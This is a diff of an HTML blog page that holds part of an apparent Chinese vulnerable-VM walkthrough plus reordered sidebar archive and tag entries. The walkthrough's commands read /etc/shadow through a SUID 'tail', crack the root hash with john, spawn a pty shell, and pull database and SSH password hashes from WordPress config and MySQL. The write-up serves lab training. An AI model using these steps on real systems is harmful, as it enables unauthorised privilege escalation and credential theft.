@@ -487,7 +487,7 @@ height:50vh;
 <li><p>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</p>
 </li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span> 查看内核信息</span><br><span class="line">uname -a</span><br><span class="line">Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">#</span> 比较新，有相应的 cve 可以提权，然而要等一个多小时</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 查看以 root 运行的服务</span><br><span class="line">www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root</span><br><span class="line">root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND</span><br><span class="line">root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh</span><br><span class="line">root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300</span><br><span class="line">www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 哈哈，还有个定时删除的任务</span><br><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">    rm -rf /var/www/html/uploads/*.php</span><br><span class="line">    sleep 300</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> suid</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/tail</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 能拿到 root 的哈希</span><br><span class="line">tail -n 100 /etc/shadow</span><br><span class="line">root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 把这个存为 hash</span><br><span class="line">john hash</span><br><span class="line">john --show</span><br><span class="line"><span class="meta">#</span> 得到密码：john</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看内核信息</span></span><br><span class="line">uname -a</span><br><span class="line">Linux 1afdd1f6b82c 4.15.0-29-generic #31~16.04.1-Ubuntu SMP Wed Jul 18 08:54:04 UTC 2018 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较新，有相应的 cve 可以提权，然而要等一个多小时</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看以 root 运行的服务</span></span><br><span class="line">www-data@1afdd1f6b82c:/var/www/html$ ps -aux | grep root</span><br><span class="line">root   1  0.0  1.6 388000 16496 ?    Ss   09:12   0:00 apache2 -DFOREGROUND</span><br><span class="line">root   77  0.0  0.2  18000  2560 ?   Ss   09:12   0:00 /bin/bash /etc/init.d/delete.sh</span><br><span class="line">root       370  0.0  0.0   4200   676 ?        S    12:52   0:00 sleep 300</span><br><span class="line">www-data   390  0.0  0.0  11116   944 ?        S    12:57   0:00 grep root</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 哈哈，还有个定时删除的任务</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">while [ 1 ]</span><br><span class="line">do</span><br><span class="line">    rm -rf /var/www/html/uploads/*.php</span><br><span class="line">    sleep 300</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> suid</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/tail</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 能拿到 root 的哈希</span></span><br><span class="line">tail -n 100 /etc/shadow</span><br><span class="line">root:$6$qoj6/JJi$FQe/BZlfZV9VX8m0i25Suih5vi1S//OVNpd.PvEVYcL1bWSrF3XTVTF91n60yUuUMUcP65EgT8HfjLyjGHova/:17951:0:99999:7:::</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 把这个存为 <span class="built_in">hash</span></span></span><br><span class="line">john hash</span><br><span class="line">john --show</span><br><span class="line"><span class="meta">#</span><span class="bash"> 得到密码：john</span></span><br></pre></td></tr></table></figure>
 
 <p>无法直接在 <code>nc</code> 里切到 root，拿到密码之后连接 <code>ssh</code> 试试，密码错误，必须模拟一下终端设备。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/sh")'</span><br></pre></td></tr></table></figure>
@@ -499,7 +499,7 @@ height:50vh;
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat .port</span><br><span class="line">Listen to your friends..</span><br><span class="line">7*</span><br></pre></td></tr></table></figure>
 
 <h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>找了下 7 开头的端口，发现没这玩意。不过我们遗漏了 MySQL，去看看。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat wp-config.php</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'wordpress');</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'wordpress');</span><br><span class="line">/* MySQL hostname */</span><br><span class="line">define('DB_HOST', 'db:3306');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 直接进入失败了</span><br><span class="line">mysql -u wordpress -p wordpress</span><br><span class="line">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 先拿到 ip</span><br><span class="line">ping db -c 3</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms</span><br><span class="line"><span class="meta">#</span> 还有一招</span><br><span class="line">arp -an</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 远程连接试试</span><br><span class="line">mysql -h 172.18.0.2 -u wordpress -p wordpress</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [wordpress]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| host_ssh_cred         |</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br><span class="line">select * from host_ssh_cred;</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| id                | pw                               |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat wp-config.php</span><br><span class="line">/** MySQL database username */</span><br><span class="line">define('DB_USER', 'wordpress');</span><br><span class="line">/** MySQL database password */</span><br><span class="line">define('DB_PASSWORD', 'wordpress');</span><br><span class="line">/* MySQL hostname */</span><br><span class="line">define('DB_HOST', 'db:3306');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 直接进入失败了</span></span><br><span class="line">mysql -u wordpress -p wordpress</span><br><span class="line">ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2 "No such file or directory")</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 先拿到 ip</span></span><br><span class="line">ping db -c 3</span><br><span class="line">64 bytes from experimental_db_1.experimental_default (172.18.0.2): icmp_seq=65 ttl=64 time=0.044 ms</span><br><span class="line"><span class="meta">#</span><span class="bash"> 还有一招</span></span><br><span class="line">arp -an</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程连接试试</span></span><br><span class="line">mysql -h 172.18.0.2 -u wordpress -p wordpress</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; use wordpress;</span><br><span class="line">use wordpress;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MySQL [wordpress]&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| host_ssh_cred         |</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br><span class="line">select * from host_ssh_cred;</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| id                | pw                               |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+-------------------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 
 <h3 id="拿到权限"><a href="#拿到权限" class="headerlink" title="拿到权限"></a>拿到权限</h3><p>解密可得 <code>123456</code>，此时再试试 <code>ssh</code> 连接。</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hummingbirdscyber@vulnvm:~$ id</span><br><span class="line">uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure>
@@ -687,6 +687,36 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1773,12 +1803,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-Web/">安恒杯 一月 web</a>
         </li>
     
     
@@ -1837,12 +1867,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
@@ -1880,15 +1910,15 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
         <span class="sidebar-tag-name" data-tags="读书笔记"><span class="iconfont-archer">&#xe606;</span>读书笔记</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
     
@@ -1906,6 +1936,8 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="smarty"><span class="iconfont-archer">&#xe606;</span>smarty</span>
     
+        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
+    
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
     
         <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
@@ -1918,13 +1950,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="SSRF"><span class="iconfont-archer">&#xe606;</span>SSRF</span>
     
-        <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
-    
         <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
     
-        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
-    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
